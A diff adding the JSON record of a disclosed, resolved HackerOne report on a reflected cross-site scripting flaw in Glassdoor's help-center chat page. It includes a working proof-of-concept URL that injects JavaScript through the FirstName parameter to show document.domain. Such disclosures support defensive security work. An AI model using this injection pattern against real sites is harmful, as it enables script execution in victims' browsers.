@@ -1,0 +1,131 @@
+{
+  "id": 1244053,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMjQ0MDUz",
+  "url": "https://hackerone.com/reports/1244053",
+  "title": "Reflected XSS on https://help.glassdoor.com/GD_HC_EmbeddedChatVF",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2021-06-25T10:01:47.276Z",
+  "submitted_at": "2021-06-25T10:01:47.300Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "l0cpd",
+    "url": "/l0cpd",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/f5jh3dv8lcd7q0r97vdz83wsik75/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 204,
+    "url": "https://hackerone.com/glassdoor",
+    "handle": "glassdoor",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/u258rsub76htn189l6jc17ycwrc4/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/u258rsub76htn189l6jc17ycwrc4/d9695107bfcd68eeb1c9e0912b109cdae9a6c00c0bda6fd4cbd6d9bdb828840a"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Glassdoor",
+      "twitter_handle": "glassdoor",
+      "website": "https://www.glassdoor.com/",
+      "about": "Your work people are here"
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2021-07-01T14:48:46.519Z",
+  "bug_reporter_agreed_on_going_public_at": "2021-07-01T14:45:32.500Z",
+  "team_member_agreed_on_going_public_at": "2021-07-01T14:48:46.353Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hi there,\nI have found the xss vulnerability at: `https://help.glassdoor.com/GD_HC_EmbeddedChatVF`\n\n**Browsers tested:** Firefox, Chrome, Edge (latest version)\n\n## Steps To Reproduce:\nGo to: `https://help.glassdoor.com/GD_HC_EmbeddedChatVF?FirstName=l0cpd%22};a=alert,b=document.domain,a(b)//`\n\n## Supporting Material/References (screenshots, logs, videos):\n{F1352792}\n\nRegards,\n@l0cpd\n\n## Impact\n\nThe attacker can execute JS code.",
+  "weakness": {
+    "id": 61,
+    "name": "Cross-site Scripting (XSS) - Reflected"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 1352792,
+      "file_name": "firefox_LDd0w4rMHT.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/ro089s506frnn8vigzsasl8y2luy?response-content-disposition=attachment%3B%20filename%3D%22firefox_LDd0w4rMHT.png%22%3B%20filename%2A%3DUTF-8%27%27firefox_LDd0w4rMHT.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVW4GL2BK%2F20260220%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260220T230053Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCpgarcKMpCgiucVr0ki2XTf8wUFbRI6mOb%2Fj2e7YU4ZgIhAJheDSi8Y0A5iXh2SD%2F3Lseo8Wi%2B0PDcvQw61CDQTq1DKrsFCJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igx7rsp27v9E2OxrgrkqjwXLM%2Fqs39F1uPBLsJh7n3cB7V9%2FH3VwHzloUiF0zqfG6KYFc6vhUcHffAGEJzPkmfphozgHMTOgzLm1zugGuC38t6PtOQzOyEQUn4EbnUrTGj1KOG7y%2FzvfFD6HJmjMIOvs%2B88juHStN6d0eQQLrdVw8OoTs8MV0TKDzW3%2Bp72x0BwOw5SMmS0UeiVwhWRx%2BPhuyBuEqvTJXZ1cBK%2B0nEeI7p9e6oD4Ue11pmmMZ3YHUCnO4dAcW%2F7mMsgqJZUZBQquKZ3p2yQlobp4k4jDb3tJHVbisMwBoAvNm7RyeDxc1MToCRPmGC1xJW3Zj3iPqcl6%2F2yNAlDc8YgYDykFA0r%2BFas8KIPELEualPCWtZ2pcBz0IBnHkbJsUIS93lafijhU0yMQpKn6XoJGvITqk6VRxWeSuie5xPO086II11FOaJZ%2BsbIOr%2Bif3Hfcl8nn9bHWzAVTpSVTiaMAFWBqmxb5yDZDw9%2FUt8dc%2BxwYhqE764pDHxmVEHxUXcC%2Bu5%2B9VEBM2UtuMbKKiIwQKMlm5k24S5xl4Qn1LCobZBuHPhhB8MiwMGcjL%2B8Y54E%2FPENFUDmbTSqa0RUTTmiIOlu9rYjNKMMtOuXIcG7jKdoPc1EIIcNLtuD7j9K23v1%2Fxa%2FsvMa9bfcSXJigWo3mXrjR2D1%2BUDUK0V21OELEfVMG0BYKdvjc1QOPIN3AHxNz7db6mEOfF0qD7EZZEybmZRYtBVkHXUOKAaHD8TPIZfqjLLprKsJlYPMfliuH348z1kenHq1j4NEwxvVs5cCFU%2Bsa8jprTqpLu2pZtqPw%2BzHI9NSOBsz0xXVEG13smekNtye2mIo7sHEQdB2A4dCVONyEBto94qb%2B9PolJcaB2F6mSkrhMNi94swGOrAB0%2BT1g17GjzLbpqtqbxpi07zoy7YDbUykPboNkOem9mYdhTDiAqX%2BvOLlsd%2FvrvqVM2JCaKl0E90Nmqn8Nqpq4FVOmC62nTHcVOcsj5gkljaVjfHA9jNMGZehFxmSilv%2FLsygzT56bf%2BgLzALDka8UhCAzwlI%2Fp%2BeM%2F%2Fe6HzqCNA1RDfE5M6AFgf0YGMTBuINVV47CuMkyv86aoDaz9n%2BLfa1qBy4ezKQ%2BkSrhs%2B4pV8%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=272b769710f9fdef7b44f8996cefa9c3fba26d8e4ea01a8b0b9e48b5a3b12ddd",
+      "file_size": 89376,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 46,
+  "voters": [
+    "buraaqsec",
+    "loaymorad",
+    "sw33tlie",
+    "bombon",
+    "alp",
+    "thaivu",
+    "l0cpd",
+    "ltidi",
+    "ali",
+    "run_win",
+    "and 36 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "author_type": "Team"
+  },
+  "structured_scope": {
+    "databaseId": 41608,
+    "asset_type": "WILDCARD",
+    "asset_identifier": "https://help.glassdoor.com/*",
+    "max_severity": "medium"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
